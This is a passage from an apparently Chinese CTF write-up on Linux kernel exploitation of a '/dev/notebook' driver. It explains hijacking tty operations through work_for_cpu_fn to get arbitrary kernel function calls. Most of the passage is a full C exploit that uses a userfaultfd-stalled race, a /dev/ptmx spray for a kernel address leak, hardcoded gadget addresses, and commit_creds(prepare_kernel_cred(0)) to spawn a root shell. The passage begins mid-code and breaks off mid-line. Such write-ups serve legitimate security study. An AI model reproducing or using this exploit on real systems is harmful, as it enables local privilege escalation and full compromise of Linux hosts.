class="type">unsigned</span> <span class="type">long</span>)fault_page;</span><br><span class="line">uc.len = fault_page_len;</span><br><span class="line">uc.mode = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="都什么版本了还在用传统rop-work_for_cpu_fun"><a class="markdownIt-Anchor" href="#都什么版本了还在用传统rop-work_for_cpu_fun">#</a> 都什么版本了还在用传统 ROP - work_for_cpu_fun</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们把我们的 <code>fake_tty_struct</code>  假装成 <code>work_for_cpu</code></p><p>劫持 <code>ops</code>  为 <code>work_for_cpu_fn</code></p><p>调用 <code>operation</code>  的时候正好把自己传入调用 而且非常非常干净 不篡改任何其他值</p><p>这就能实现一个单参函数调用的原语</p><p>两次原语即可 <code>commit_creds(prepare_kernel_cred(0))</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/head.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 1024</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uffd_register</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">UFFD_handler</span><span class="params">(<span class="type">void</span> *nil)</span>;</span><br><span class="line"><span class="type">int</span> uffd, note_fd;</span><br><span class="line"><span class="type">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class="line"><span class="type">uint64_t</span> fault_page, fault_page_len;</span><br><span class="line"><span class="type">uint64_t</span> target, modprobe_path;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> errExit(msg) &#123; \</span></span><br><span class="line"><span class="meta">perror(msg);       \</span></span><br><span class="line"><span class="meta">exit(1);   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">uint64_t</span> idx;</span><br><span class="line"><span class="type">uint64_t</span> size;</span><br><span class="line"><span class="type">uint64_t</span> buf;</span><br><span class="line">&#125;userarg;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ELEM 0x100</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span> </span><br><span class="line">SWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class="line">PREPARE_KERNEL_CRED, </span><br><span class="line">SUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class="line">POP_RDI ,POP_RSP,</span><br><span class="line">MOV_RDI_RAX_POP_RET,</span><br><span class="line">TERMINATOR</span><br><span class="line">&#125;;<span class="comment">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class="line">u64 a[MAX_ELEM];</span><br><span class="line"><span class="comment">//tty_struct结构体的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class="line"><span class="type">int</span> protect1[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> ptmx_fds[<span class="number">0x100</span>];<span class="comment">// 测了我很久才发现这个b被不知道谁溢出了 加两个保护挡一下</span></span><br><span class="line"><span class="type">int</span> protect2[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">a[SWAPGS_POP_RET] = <span class="number">0xffffffff810637d4</span>;</span><br><span class="line">a[IRETQ] = <span class="number">0xffffffff810338bb</span>;</span><br><span class="line">a[COMMIT_CREDS] = <span class="number">0xffffffff810a9b40</span>;</span><br><span class="line">a[PREPARE_KERNEL_CRED]= <span class="number">0xffffffff810a9ef0</span>;</span><br><span class="line">a[SUB_RSP_RET] = <span class="number">0xffffffff8100354f</span>;</span><br><span class="line">a[PUSH_RDI_POP_RSP_POP_RET] = <span class="number">0xffffffff8143f4e1</span>;</span><br><span class="line">a[POP_RDI]    = <span class="number">0xffffffff81007115</span>;</span><br><span class="line">a[POP_RSP] = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line">a[MOV_RDI_RAX_POP_RET]= <span class="number">0xffffffff81045833</span>;</span><br><span class="line">&#125;</span><br><span class="line">u64 work_for_cpu_fn = <span class="number">0xffffffff8109eb90</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">addKernelBase</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class="line">a[i] += kernel_base_addr - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">()</span>&#123;</span><br><span class="line">Info(<span class="string">&quot;UID is %d&quot;</span>, getuid());</span><br><span class="line"><span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">Done(<span class="string">&quot;Get shell&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Panic(<span class="string">&quot;Get shell failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveState</span><span class="params">()</span>&#123;</span><br><span class="line">__asm__ (</span><br><span class="line"><span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line"><span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line"><span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line"><span class="string">&quot;pushf;&quot;</span></span><br><span class="line"><span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">);</span><br><span class="line">Done(<span class="string">&quot;saveState&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class="line"><span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))(a[COMMIT_CREDS]);</span><br><span class="line">(*cc)((*pkc)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">arg.size = (<span class="type">uint64_t</span>)size;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">0x100</span> ,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">ioctl(note_fd, <span class="number">0x200</span> ,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> newsize, <span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">arg.size = (<span class="type">uint64_t</span>)newsize;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">0x300</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">char</span> *user_buf)</span>&#123;</span><br><span class="line">write(note_fd, user_buf, idx);<span class="comment">// 逆向 mynote_read可以得到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">char</span> *user_buf)</span>&#123;</span><br><span class="line">read(note_fd, user_buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">void</span> *buf;</span><br><span class="line">u64 size;</span><br><span class="line">&#125;notebook;</span><br><span class="line"></span><br><span class="line">notebook ntbk[<span class="number">10</span>];</span><br><span class="line"><span class="type">uint64_t</span> heap[<span class="number">2</span>];</span><br><span class="line"><span class="type">uint64_t</span> notebook_addr;</span><br><span class="line">u64 fake_tty_struct[<span class="number">128</span>];</span><br><span class="line">u64 fake_tty_ops[<span class="number">128</span>];</span><br><span class="line"><span class="type">char</span> zero[PAGE_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">u64 a[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *arg;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">init();</span><br><span class="line">saveState();</span><br><span class="line">note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">Info(<span class="string">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class="line"><span class="keyword">if</span>(note_fd &lt; <span class="number">0</span>) errExit(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">buf = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);<span class="comment">// name的长度</span></span><br><span class="line"></span><br><span class="line">FILE * stream = popen(<span class="string">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">fread(buf, <span class="number">0x10</span> + <span class="number">2</span>, <span class="number">1</span> ,stream);</span><br><span class="line">mod_base_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">Info(<span class="string">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class="line"></span><br><span class="line">fault_page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class="line">MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">fault_page_len = <span class="number">0x1000</span>;</span><br><span class="line">uffd_register();</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span> ,<span class="number">0x60</span> ,zero);</span><br><span class="line">edit(<span class="number">0</span> ,<span class="number">0x3ff</span> ,zero);<span class="comment">// 重新申请一个0x400的块</span></span><br><span class="line">edit(<span class="number">0</span> ,<span class="number">0x400</span> ,fault_page);<span class="comment">// 返回上一个原块的地址 写完size就卡住</span></span><br><span class="line"></span><br><span class="line">getchar();<span class="comment">// 等待线程完成它的工作</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)&#123;</span><br><span class="line"><span class="comment">// Info(&quot;ptmx_fds[%d] is %d&quot;, i, ptmx_fds[i]);</span></span><br><span class="line">ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read_from_kernel(<span class="number">0</span>, fake_tty_struct);</span><br><span class="line"><span class="comment">//验证魔数</span></span><br><span class="line"><span class="keyword">if</span>(fake_tty_struct[<span class="number">0</span>]  != <span class="number">0x0000000100005401</span>)</span><br><span class="line">Panic(<span class="string">&quot;Magic number error, abort&quot;</span>);</span><br><span class="line">Info(<span class="string">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class="line"><span class="comment">// 此时gdb看内存 可以看到相关泄漏的地址</span></span><br><span class="line">u64 ptm_unix98_ops_addr = fake_tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ((ptm_unix98_ops_addr &amp; <span class="number">0xFFF</span>) == <span class="number">0x320</span>) ptm_unix98_ops_addr += <span class="number">0x120</span>;</span><br><span class="line"></span><br><span class="line">kernel_base_addr = ptm_unix98_ops_addr - <span class="number">0xe8e440</span>;</span><br><span class="line">Info(<span class="string">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class="line">addKernelBase();</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, zero);</span><br><span class="line">edit(<span class="number">1</span> ,<span class="number">0x400</span> ,zero);</span><br><span class="line"></span><br><span class="line">gift(ntbk);</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = ntbk[<span class="number">1</span>].buf;<span class="comment">// ops&#x27;s addr</span></span><br><span class="line">fake_tty_struct[<span class="number">4</span>] = a[PREPARE_KERNEL_CRED];</span><br><span class="line">fake_tty_struct[<span class="number">5</span>] = <span class="literal">NULL</span>;</span><br><span class="line">fake_tty_struct[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fake_tty_ops[<span class="number">12</span>] = work_for_cpu_fn;</span><br><span class="line"></span><br><span class="line">write_to_kernel(<span class="number">0</span>, fake_tty_struct);</span><br><span class="line">write_to_kernel(<span class="number">1</span>, fake_tty_ops);</span><br><span class="line"></span><br><span class="line">Info(<span class="string">&quot;prepare kernel cred...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">ioctl(ptmx_fds[i], <span class="number">111</span>, <span class="number">111</span>);</span><br><span class="line"></span><br><span class="line">Done(<span class="string">&quot;prepare&quot;</span>);</span><br><span class="line"></span><br><span class="line">Info(<span class="string">&quot;work_for_cpu_fn return 0x%lx&quot;</span>, fake_tty_struct[<span class="number">6</span>]);</span><br><span class="line">read_from_kernel(<span class="number">0</span>, fake_tty_struct);</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = ntbk[<span class="number">1</span>].buf;<span class="comment">// ops&#x27;s addr</span></span><br><span class="line">fake_tty_struct[<span class="number">4</span>] = a[COMMIT_CREDS];</span><br><span class="line">fake_tty_struct[<span class="number">5</span>] = fake_tty_struct[<span class="number">6</span>];</span><br><span class="line">write_to_kernel(<span class="number">0</span>, fake_tty_struct);</span><br><span class="line"></span><br><span class="line">Info(<span class="string">&quot;commit creds...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">ioctl(ptmx_fds[i], <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">Done(<span class="string">&quot;commit&quot;</span>);</span><br><span class="line"></span><br><span class="line">getshell();</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uffd_register</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span><span class="comment">// io operation api</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span><span class="comment">// io register</span></span><br><span class="line">    <span class="comment">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">Dbg(<span class="string">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class="line"></span><br><span class="line">ua.api = UFFD_API;</span><br><span class="line">ua.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>) </span><br><span class="line">errExit(<span class="string">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class="line"></span><br><span class="line">ur.range.start = (<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)fault_page;</span><br><span class="line">ur.range.len   = fault_page_len;</span><br><span class="line">ur.mode    = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">errExit(<span class="string">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> thr;</span><br><span class="line"><span class="comment">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class="line"><span class="keyword">if</span>(pthread_create(&amp;thr, <span class="literal">NULL</span>, UFFD_handler ,<span class="literal">NULL</span>))</span><br><span class="line">errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">Done(<span class="string">&quot;regitser&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">UFFD_handler</span><span class="params">(<span class="type">void</span> *nil)</span>&#123;</span><br><span class="line">Dbg(<span class="string">&quot;UFFD handler start&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line"><span class="type">int</span> nready = <span class="number">0</span>;</span><br><span class="line">pollfd.fd= uffd;</span><br><span class="line">pollfd.events= POLLIN ;</span><br><span class="line">nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);<span class="comment">// block here</span></span><br><span class="line"><span class="keyword">if</span>(nready != <span class="number">1</span>)</span><br><span class="line">errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment">// user code modify area</span></span><br><span class="line">edit(<span 